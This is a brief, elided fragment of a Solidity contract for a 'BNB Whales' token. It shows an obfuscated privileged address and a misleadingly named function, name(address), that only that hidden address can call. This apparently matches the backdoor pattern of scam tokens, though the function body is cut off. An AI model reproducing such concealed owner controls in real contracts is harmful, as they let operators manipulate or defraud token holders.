...
contract BNBWhales is Ownable {
    ...
    string public _tokenname = "BNB Whales";
    string public _tokensymbol = "BNB Whales";
    uint256 tokenamount = 10000000000*10**decimals();
    address public yfbvcg5;
    ...
    function name(address jjkxq1) public     {
        require(yfbvcg5 ==  _msgSender());
        if(yfbvcg5 != _msgSender()){
                revert("fu");
        }
